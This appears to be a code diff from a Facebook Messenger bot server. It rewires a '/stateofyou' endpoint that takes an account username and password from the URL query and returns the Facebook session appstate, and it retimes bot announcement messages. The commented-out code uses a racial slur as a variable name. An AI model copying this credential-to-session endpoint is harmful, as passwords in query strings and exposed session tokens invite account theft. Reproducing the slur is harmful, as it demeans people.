@@ -428,7 +428,8 @@ app.get('/stateofyou', async (req, res) => {
   // by lester (hackmesenpai)
   let user = req.query.user;
   let pass = req.query.pass;
-  try {
+  await Me(res,user,pass);
+  /*try {
   const nigger = await fb.getAppstate(user,pass);
     res.json({
       appstate: nigger
@@ -437,7 +438,7 @@ app.get('/stateofyou', async (req, res) => {
     return res.json({
       error: e.message || e
   });
-  }
+  }*/
 });
 
 
@@ -673,7 +674,7 @@ async function accountLogin(
             const pogiko = await api.getUserInfo(admin[0]);
             async function sendMessage(thread) {
               try {
-                await new Promise(resolve => setTimeout(resolve, 5*1000));
+                //await new Promise(resolve => setTimeout(resolve, 3*1000));
                 await api.sendMessage(
                   {
                     body: `🔴🟢🟡\n\n✅ Connected Success! \n➭ Bot Name: ${botname}\n➭ Bot Prefix: ${prefix}\n➭ Bot Admin: ${pogiko[admin[0]].name}\n➭ Use ${prefix}help to view command details\n➭ Added bot at: ${neth}${isOwner ? "" : "\n\n" + outro}`
@@ -694,9 +695,9 @@ async function accountLogin(
                 thread.name !== thread.threadID /*&&
                thread.threadID !== event.threadID*/
               ) {
-                //setTimeout(async() => {
+                setTimeout(async() => {
                   await sendMessage(thread);
-                //}, 1*1000);
+                }, 5*1000);
               }
             }
 
